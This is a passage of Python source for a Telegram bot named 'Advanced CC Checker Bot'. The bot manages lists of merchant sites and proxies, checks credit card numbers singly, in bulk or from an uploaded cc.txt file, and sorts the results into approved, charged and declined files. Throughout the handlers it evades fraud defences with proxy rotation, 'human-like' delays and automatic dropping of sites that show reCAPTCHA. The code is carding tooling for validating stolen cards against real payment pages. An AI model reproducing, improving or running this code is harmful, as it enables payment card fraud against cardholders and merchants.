                    f"💲 Price: NA\n"
                    f"🔌 Proxy: {proxy_param}\n"
                    f"📡 Response: Timeout"),
            "status": "error",
            "has_recaptcha": False
        }
    except Exception as e:
        console_log_error(str(e), cc, site)
        return {
            "text": (f"CC: {cc}\n"
                    f"🌐 Gateway: NA\n"
                    f"💲 Price: NA\n"
                    f"🔌 Proxy: {proxy_param}\n"
                    f"📡 Response: Exception → {str(e)}"),
            "status": "error",
            "has_recaptcha": False
        }


# ---- Commands ----
@dp.message(Command("cmds"))
async def cmds(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] User {message.from_user.username} used /cmds")
    cmds_list = """
📌 Available Commands:

🌐 Site Management:
/add <site> - Add site to list
/checksite <site> - Verify site with test card
/delsite <site> - Delete site from list
/show - Show all sites
/showverified - Show verified sites only
/showblacklist - Show blacklisted sites

🔌 Proxy Management (REQUIRED):
/addproxy <proxy> - Add proxy
/delproxy <proxy> - Delete proxy
/showproxy - Show all proxies
/clearproxy - Clear all proxies

💳 CC Checking:
/chk <cc> - Check single CC
/mchk <ccs> - Check multiple CCs
/chktxt - Reply with cc.txt file

📊 Other:
/cmds - Show all commands
/status - Show bot status

⚠️ NOTE: Add proxy first before checking!
"""
    await message.answer(cmds_list)


# ---- Site Management ----
@dp.message(Command("add"))
async def add_site(message: types.Message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /add <site>")
        return
    
    site = parts[1].strip()
    print(f"{Fore.CYAN}[COMMAND] Adding site: {site}")
    
    if site in blacklisted_sites:
        await message.answer(f"🚫 This site is blacklisted")
        return
    
    if site in sites:
        await message.answer("⚠️ Site already exists.")
        return
    
    sites.append(site)
    print(f"{Fore.GREEN}[SUCCESS] Site added: {site}")
    await message.answer(f"✅ Site added: {site}\n📊 Total sites: {len(sites)}\n\n⚠️ Use /checksite {site} to verify it's working")


@dp.message(Command("checksite"))
async def check_site(message: types.Message):
    if not proxies:
        await message.answer("⚠️ Please add proxy first using /addproxy <proxy>")
        return
    
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /checksite <site>")
        return
    
    site = parts[1].strip()
    
    print(f"{Fore.CYAN}[COMMAND] Checking site: {site}")
    msg = await message.answer(f"🔍 Verifying site: {site}\n🎯 Using test card: {TEST_CARD[:4]}****")
    
    is_valid, response = await verify_site(site)
    
    if is_valid:
        if site not in verified_sites:
            verified_sites.append(site)
        print(f"{Fore.GREEN}[VERIFIED] Site {site} is valid")
        await msg.edit_text(f"✅ Site Verified!\n🌐 Site: {site}\n📡 {response}\n\n✨ Site is ready for checking!")
    else:
        if site not in blacklisted_sites:
            blacklisted_sites.append(site)
        if site in sites:
            sites.remove(site)
        if site in verified_sites:
            verified_sites.remove(site)
        print(f"{Fore.RED}[BLACKLISTED] Site {site} failed verification")
        await msg.edit_text(f"❌ Site Failed!\n🌐 Site: {site}\n📡 {response}\n\n🚫 Site has been blacklisted")


@dp.message(Command("delsite"))
async def del_site(message: types.Message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /delsite <site>")
        return
    site = parts[1].strip()
    
    print(f"{Fore.CYAN}[COMMAND] Deleting site: {site}")
    
    removed = False
    if site in sites:
        sites.remove(site)
        removed = True
    if site in verified_sites:
        verified_sites.remove(site)
        removed = True
    if site in blacklisted_sites:
        blacklisted_sites.remove(site)
        removed = True
    
    if removed:
        print(f"{Fore.GREEN}[SUCCESS] Site removed: {site}")
        await message.answer(f"🗑️ Site removed: {site}")
    else:
        print(f"{Fore.RED}[ERROR] Site not found: {site}")
        await message.answer("⚠️ Site not found.")


@dp.message(Command("show"))
async def show_sites(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Show sites requested")
    if not sites:
        await message.answer("⚠️ No sites added yet.")
    else:
        site_list = ""
        for i, site in enumerate(sites, 1):
            status = "✅" if site in verified_sites else "⏳"
            site_list += f"{i}. {status} {site}\n"
        await message.answer(f"🌐 All Sites ({len(sites)}):\n{site_list}\n✅=Verified ⏳=Not Verified")


@dp.message(Command("showverified"))
async def show_verified(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Show verified sites requested")
    if not verified_sites:
        await message.answer("⚠️ No verified sites yet. Use /checksite to verify sites.")
    else:
        site_list = "\n".join([f"{i}. ✅ {site}" for i, site in enumerate(verified_sites, 1)])
        await message.answer(f"✅ Verified Sites ({len(verified_sites)}):\n{site_list}")


@dp.message(Command("showblacklist"))
async def show_blacklist(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Show blacklist requested")
    if not blacklisted_sites:
        await message.answer("✅ No blacklisted sites")
    else:
        bl_list = "\n".join([f"{i}. 🚫 {site}" for i, site in enumerate(blacklisted_sites, 1)])
        await message.answer(f"🚫 Blacklisted Sites ({len(blacklisted_sites)}):\n{bl_list}")


# ---- Proxy Management ----
@dp.message(Command("addproxy"))
async def add_proxy(message: types.Message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /addproxy <proxy>\nFormat: ip:port or user:pass@ip:port")
        return
    proxy = parts[1].strip()
    
    print(f"{Fore.CYAN}[COMMAND] Adding proxy: {proxy}")
    
    if proxy not in proxies:
        proxies.append(proxy)
        print(f"{Fore.GREEN}[SUCCESS] Proxy added: {proxy}")
        await message.answer(f"✅ Proxy added: {proxy}\n📊 Total proxies: {len(proxies)}")
    else:
        print(f"{Fore.YELLOW}[WARNING] Proxy already exists: {proxy}")
        await message.answer("⚠️ Proxy already exists.")


@dp.message(Command("delproxy"))
async def del_proxy(message: types.Message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /delproxy <proxy>")
        return
    proxy = parts[1].strip()
    
    print(f"{Fore.CYAN}[COMMAND] Deleting proxy: {proxy}")
    
    if proxy in proxies:
        proxies.remove(proxy)
        print(f"{Fore.GREEN}[SUCCESS] Proxy removed: {proxy}")
        await message.answer(f"🗑️ Proxy removed: {proxy}\n📊 Total proxies: {len(proxies)}")
    else:
        print(f"{Fore.RED}[ERROR] Proxy not found: {proxy}")
        await message.answer("⚠️ Proxy not found.")


@dp.message(Command("showproxy"))
async def show_proxies(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Show proxies requested")
    if not proxies:
        await message.answer("⚠️ No proxies added yet.")
    else:
        proxy_list = "\n".join([f"{i}. {proxy}" for i, proxy in enumerate(proxies, 1)])
        await message.answer(f"🔌 Added Proxies ({len(proxies)}):\n{proxy_list}")


@dp.message(Command("clearproxy"))
async def clear_proxies(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Clearing all proxies")
    proxies.clear()
    print(f"{Fore.GREEN}[SUCCESS] All proxies cleared")
    await message.answer("🗑️ All proxies cleared!")


# ---- Status Command ----
@dp.message(Command("status"))
async def status(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Status requested")
    status_msg = f"""
🤖 Bot Status:
━━━━━━━━━━━━━━━
🌐 Total Sites: {len(sites)}
✅ Verified Sites: {len(verified_sites)}
🚫 Blacklisted: {len(blacklisted_sites)}
🔌 Proxies: {len(proxies)}
📝 Sessions: {len(sessions_data)}
━━━━━━━━━━━━━━━
🛡️ Protection: Active
🎯 Test Card: {TEST_CARD[:4]}****
⚠️ Proxy Required: {"Yes" if not proxies else f"✅ {len(proxies)} Added"}
"""
    await message.answer(status_msg)


# ---- CC Checking Commands ----
@dp.message(Command("chk"))
async def chk(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Single CC check requested by {message.from_user.username}")
    
    if not proxies:
        await message.answer("⚠️ Please add proxy first!\nUse: /addproxy <proxy>")
        return
    
    if not verified_sites:
        await message.answer("⚠️ No verified sites available!\nPlease verify sites using /checksite <site>")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /chk <cc>")
        return

    cc = parts[1].strip()
    print(f"{Fore.YELLOW}[CHECKING] CC: {cc[:4]}****")
    msg = await message.answer("⏳ CHECKING...")
    
    # Use random proxy
    proxy = random.choice(proxies)
    
    # Use random verified site
    site = random.choice(verified_sites)
    
    print(f"{Fore.CYAN}[INFO] Using site: {site}, proxy: {proxy}")
    
    result = await check_cc(cc, site, proxy)
    
    # If recaptcha detected, move site to blacklist
    if result["has_recaptcha"]:
        if site in verified_sites:
            verified_sites.remove(site)
        if site not in blacklisted_sites:
            blacklisted_sites.append(site)
        print(f"{Fore.RED}[BLACKLIST] Site {site} added to blacklist (recaptcha)")
        await message.answer(f"🚫 Site {site} has been blacklisted (recaptcha detected)")
    
    # Add status emoji
    status_emoji = {"approved": "✅", "charged": "💳", "declined": "❌", "error": "⚠️"}
    final_text = f"{status_emoji.get(result['status'], '❓')} Status: {result['status'].upper()}\n\n{result['text']}"
    
    await msg.edit_text(final_text)


@dp.message(Command("mchk"))
async def mchk(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Multiple CC check requested by {message.from_user.username}")
    
    if not proxies:
        await message.answer("⚠️ Please add proxy first!\nUse: /addproxy <proxy>")
        return
    
    if not verified_sites:
        await message.answer("⚠️ No verified sites available!\nPlease verify sites using /checksite <site>")
        return

    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        await message.answer("⚠️ Usage: /mchk <ccs>")
        return

    ccs = parts[1].splitlines()
    
    print(f"{Fore.YELLOW}[BULK CHECK] Starting check for {len(ccs)} cards")
    
    # Initialize result lists
    approved_results = []
    charged_results = []
    declined_results = []
    
    msg = await message.answer(f"⏳ Checking multiple CCs...\n✅ Using {len(verified_sites)} verified sites\n🔌 Using {len(proxies)} proxies")
    
    total = len(ccs)
    session_id = hashlib.md5(f"bulk_{time.time()}".encode()).hexdigest()
    
    for index, cc in enumerate(ccs, 1):
        # Human-like random delay
        if index > 1:
            delay = get_human_delay()
            print(f"{Fore.CYAN}[DELAY] Waiting {delay:.1f} seconds before next check")
            await msg.edit_text(f"⏳ Waiting {delay:.1f} seconds... ({index}/{total})")
            await asyncio.sleep(delay)
        
        await msg.edit_text(f"⏳ Checking CC {index}/{total}...")
        print(f"{Fore.YELLOW}[PROGRESS] Checking card {index}/{total}")
        
        # Smart proxy rotation
        proxy = proxies[index % len(proxies)] if proxies else None
        
        # Random verified site selection
        if not verified_sites:
            print(f"{Fore.RED}[ERROR] All sites blacklisted!")
            await message.answer("❌ All verified sites have been blacklisted! Verify new sites.")
            break
        
        site = random.choice(verified_sites)
        
        res = await check_cc(cc.strip(), site, proxy, session_id)
        
        # Handle recaptcha detection
        if res["has_recaptcha"]:
            if site in verified_sites:
                verified_sites.remove(site)
            if site not in blacklisted_sites:
                blacklisted_sites.append(site)
            print(f"{Fore.RED}[BLACKLIST] Site {site} blacklisted")
            await message.answer(f"🚫 Site {site} blacklisted (recaptcha)")
            continue
        
        # Categorize results
        if res["status"] == "approved":
            approved_results.append(res["text"])
        elif res["status"] == "charged":
            charged_results.append(res["text"])
        else:
            declined_results.append(res["text"])
        
        # Show progress
        status_text = (f"📊 Progress: {index}/{total}\n"
                      f"✅ Approved: {len(approved_results)}\n"
                      f"💳 Charged: {len(charged_results)}\n"
                      f"❌ Declined: {len(declined_results)}\n"
                      f"🌐 Active Sites: {len(verified_sites)}")
        await msg.edit_text(status_text)
    
    # Log summary to console
    console_log_summary(total, len(approved_results), len(charged_results), len(declined_results))
    
    # Save results to separate files
    files_to_send = []
    
    if approved_results:
        with open("approved.txt", "w") as f:
            f.write("\n\n".join(approved_results))
        files_to_send.append(("approved.txt", f"✅ Approved: {len(approved_results)}"))
    
    if charged_results:
        with open("charged.txt", "w") as f:
            f.write("\n\n".join(charged_results))
        files_to_send.append(("charged.txt", f"💳 Charged: {len(charged_results)}"))
    
    if declined_results:
        with open("declined.txt", "w") as f:
            f.write("\n\n".join(declined_results))
        files_to_send.append(("declined.txt", f"❌ Declined: {len(declined_results)}"))
    
    # Send summary
    summary = (f"✅ Check Complete!\n\n"
              f"📊 Total Checked: {total}\n"
              f"✅ Approved: {len(approved_results)}\n"
              f"💳 Charged: {len(charged_results)}\n"
              f"❌ Declined: {len(declined_results)}")
    await message.answer(summary)
    
    # Send files
    for filename, caption in files_to_send:
        await message.answer_document(FSInputFile(filename), caption=caption)


@dp.message(Command("chktxt"))
async def chktxt(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] File check requested by {message.from_user.username}")
    
    if not proxies:
        await message.answer("⚠️ Please add proxy first!\nUse: /addproxy <proxy>")
        return
    
    if not verified_sites:
        await message.answer("⚠️ No verified sites available!\nPlease verify sites using /checksite <site>")
        return

    if not message.reply_to_message or not message.reply_to_message.document:
        await message.answer("⚠️ Reply to a cc.txt file with /chktxt")
        return

    file = await bot.get_file(message.reply_to_message.document.file_id)
    cc_file = "cc.txt"
    await bot.download_file(file.file_path, cc_file)

    with open(cc_file, "r") as f:
        ccs = f.read().splitlines()

    print(f"{Fore.YELLOW}[FILE CHECK] Starting check for {len(ccs)} cards from file")

    # Initialize result lists
    approved_results = []
    charged_results = []
    declined_results = []
    
    msg = await message.answer(f"⏳ Checking cc.txt...\n✅ Using {len(verified_sites)} verified sites\n🔌 Using {len(proxies)} proxies")
    
    total = len(ccs)
    session_id = hashlib.md5(f"file_{time.time()}".encode()).hexdigest()
    
    for index, cc in enumerate(ccs, 1):
        # Human-like random delay
        if index > 1:
            delay = get_human_delay()
            print(f"{Fore.CYAN}[DELAY] Waiting {delay:.1f} seconds before next check")
            await msg.edit_text(f"⏳ Waiting {delay:.1f} seconds... ({index}/{total})")
            await asyncio.sleep(delay)
        
        await msg.edit_text(f"⏳ Checking CC {index}/{total}...")
        print(f"{Fore.YELLOW}[PROGRESS] Checking card {index}/{total}")
        
        # Smart proxy rotation
        proxy = proxies[index % len(proxies)] if proxies else None
        
        # Random verified site selection
        if not verified_sites:
            print(f"{Fore.RED}[ERROR] All sites blacklisted!")
            await message.answer("❌ All verified sites have been blacklisted! Verify new sites.")
            break
        
        site = random.choice(verified_sites)
        
        res = await check_cc(cc.strip(), site, proxy, session_id)
        
        # Handle recaptcha detection
        if res["has_recaptcha"]:
            if site in verified_sites:
                verified_sites.remove(site)
            if site not in blacklisted_sites:
                blacklisted_sites.append(site)
            print(f"{Fore.RED}[BLACKLIST] Site {site} blacklisted")
            await message.answer(f"🚫 Site {site} blacklisted (recaptcha)")
            continue
        
        # Categorize results
        if res["status"] == "approved":
            approved_results.append(res["text"])
        elif res["status"] == "charged":
            charged_results.append(res["text"])
        else:
            declined_results.append(res["text"])
        
        # Show progress
        status_text = (f"📊 Progress: {index}/{total}\n"
                      f"✅ Approved: {len(approved_results)}\n"
                      f"💳 Charged: {len(charged_results)}\n"
                      f"❌ Declined: {len(declined_results)}\n"
                      f"🌐 Active Sites: {len(verified_sites)}")
        await msg.edit_text(status_text)
    
    # Log summary to console
    console_log_summary(total, len(approved_results), len(charged_results), len(declined_results))
    
    # Save results to separate files
    files_to_send = []
    
    if approved_results:
        with open("approved.txt", "w") as f:
            f.write("\n\n".join(approved_results))
        files_to_send.append(("approved.txt", f"✅ Approved: {len(approved_results)}"))
    
    if charged_results:
        with open("charged.txt", "w") as f:
            f.write("\n\n".join(charged_results))
        files_to_send.append(("charged.txt", f"💳 Charged: {len(charged_results)}"))
    
    if declined_results:
        with open("declined.txt", "w") as f:
            f.write("\n\n".join(declined_results))
        files_to_send.append(("declined.txt", f"❌ Declined: {len(declined_results)}"))
    
    # Send summary
    summary = (f"✅ Check Complete!\n\n"
              f"📊 Total Checked: {total}\n"
              f"✅ Approved: {len(approved_results)}\n"
              f"💳 Charged: {len(charged_results)}\n"
              f"❌ Declined: {len(declined_results)}")
    await message.answer(summary)
    
    # Send files
    for filename, caption in files_to_send:
        await message.answer_document(FSInputFile(filename), caption=caption)


# ---- Start ----
@dp.message(Command("start"))
async def start(message: types.Message):
    print(f"{Fore.CYAN}[COMMAND] Bot started by {message.from_user.username}")
    welcome_msg = """
👋 Welcome to Advanced CC Checker Bot!

⚠️ IMPORTANT STEPS:
1️⃣ Add proxy first: /addproxy <proxy>
2️⃣ Add site: /add <site>
3️⃣ Verify site: /checksite <site>
4️⃣ Start checking: /chk <cc>

🛡️ Protection Features:
• Site verification with test card
• Auto-detect & blacklist bad sites
• Random site rotation
• Human-like delays
• Smart proxy rotation

📌 Test Card: 5125****

Use /cmds to see all commands.
Use /status to check bot status.
"""
    await message.answer(welcome_msg)


async def main():
    logging.basicConfig(level=logging.INFO)
    
    # Console startup message
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.YELLOW}🤖 Advanced CC Checker Bot Starting...")
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.GREEN}🎯 Test Card: {TEST_CARD[:4]}****")
    print(f"{Fore.GREEN}🌐 Sites loaded: {len(sites)}")
    print(f"{Fore.GREEN}✅ Verified sites: {len(verified_sites)}")
    print(f"{Fore.GREEN}🔌 Proxies loaded: {len(proxies)}")
    print(f"{Fore.GREEN}🛡️ Site Verification: ACTIVE")
    print(f"{Fore.GREEN}📊 Console Logging: ENABLED")
    print(f"{Fore.BLUE}{'='*60}")
    print(f"{Fore.YELLOW}✅ Bot Ready! Monitoring all API requests...")
    print(f"{Fore.BLUE}{'='*60}\n")
    
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())
